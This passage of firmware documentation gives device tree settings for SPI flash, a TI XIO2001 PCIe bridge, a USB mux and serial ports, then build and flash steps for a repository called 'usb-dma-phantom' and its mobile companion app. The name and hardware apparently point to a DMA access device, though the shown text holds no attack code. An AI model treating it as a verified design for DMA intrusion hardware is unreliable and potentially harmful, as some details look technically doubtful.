        regulator-min-microvolt = <3300000>;
        regulator-max-microvolt = <3300000>;
        vin-supply = <&v3v3>;
    };
};

&spi4 {
    status = "okay";
    cs-gpios = <&gpioc 5 GPIO_ACTIVE_LOW>,   /* Flash CS */
               <&gpioc 4 GPIO_ACTIVE_LOW>;    /* XIO2001 CS */
    pinctrl-0 = <&spi4_default>;
    spi-max-frequency = <50000000>;

    w25q128: flash@0 {
        compatible = "winbond,w25q128jv";
        reg = <0>;
        spi-max-frequency = <104000000>;  /* Fast read mode */
        size = <16777216>;                /* 16 MB */
        jedec-id = [ef 40 18];
    };

    xio2001: pcie-bridge@1 {
        compatible = "ti,xio2001";
        reg = <1>;
        spi-max-frequency = <50000000>;
        reset-gpios = <&gpioc 15 GPIO_ACTIVE_LOW>;
        inta-gpios = <&gpioc 7 GPIO_ACTIVE_LOW>;
        serr-gpios = <&gpioc 6 GPIO_ACTIVE_LOW>;
        clkreq-gpios = <&gpioc 2 GPIO_ACTIVE_LOW>;
    };
};

&usart4 {
    status = "okay";
    pinctrl-0 = <&usart4_default>;
    current-speed = <1000000>;  /* 1 Mbps */
    hw-flow-control = <1>;
};

&i2c1 {
    status = "okay";
    pinctrl-0 = <&i2c1_default>;
    clock-frequency = <I2C_BITRATE_FAST>;  /* 400 kHz */

    hd3ss460: mux@12 {
        compatible = "ti,hd3ss460";
        reg = <0x12>;
        ctl1-gpios = <&gpioc 3 GPIO_ACTIVE_HIGH>;
        ctl2-gpios = <&gpioa 12 GPIO_ACTIVE_HIGH>;
        ctl3-gpios = <&gpioc 8 GPIO_ACTIVE_HIGH>;
        ctl4-gpios = <&gpioc 9 GPIO_ACTIVE_HIGH>;
    };
};

&usb_otg_fs {
    status = "okay";
    pinctrl-0 = <&usb_default>;
    dr_mode = "peripheral";
    maximum-speed = "full-speed";
    vbus-gpios = <&gpiob 13 GPIO_ACTIVE_HIGH>;
};

&usart4_default {
    pins = <&gpioa 1 UART4_RX>,
           <&gpioa 2 UART4_TX>,
           <&gpioa 3 UART4_RTS>,
           <&gpioa 4 UART4_CTS>;
    bias-pull-up;
    drive-open-drain;
};

&spi4_default {
    pins = <&gpioa 5 SPI4_SCK>,
           <&gpioa 6 SPI4_MISO>,
           <&gpioa 7 SPI4_MOSI>;
    push-pull;
    slew-rate = "very-high-speed";
};

&i2c1_default {
    pins = <&gpiob 0 I2C1_SCL>,
           <&gpiob 1 I2C1_SDA>;
    bias-pull-up;
    drive-open-drain;
};
```

## 7. Build Instructions

### 7.1 Prerequisites

```bash
# Install ARM GCC toolchain
sudo apt-get install gcc-arm-none-eabi binutils-arm-none-eabi

# Install Make
sudo apt-get install make

# Install OpenOCD (for flashing)
sudo apt-get install openocd

# Clone repository
git clone https://github.com/usb-dma-phantom/firmware.git
cd firmware
```

### 7.2 Build Firmware

```bash
# Build all targets
make all

# Build specific target
make main.elf
make main.hex
make main.bin

# Clean build
make clean

# Flash via OpenOCD (SWD)
make flash

# Flash via USB DFU
make dfu-flash
```

### 7.3 Makefile Targets

| Target | Description |
|--------|-------------|
| `all` | Build .elf, .hex, .bin |
| `flash` | Flash via OpenOCD/SWD |
| `dfu-flash` | Flash via USB DFU |
| `erase` | Erase flash |
| `size` | Print section sizes |
| `objdump` | Disassemble .elf |
| `clean` | Remove build artifacts |

### 7.4 Companion App Build

```bash
# Install dependencies
cd app/
npm install

# Run on Android
npx react-native run-android

# Run on iOS
npx react-native run-ios

# Build release APK
cd android && ./gradlew assembleRelease
```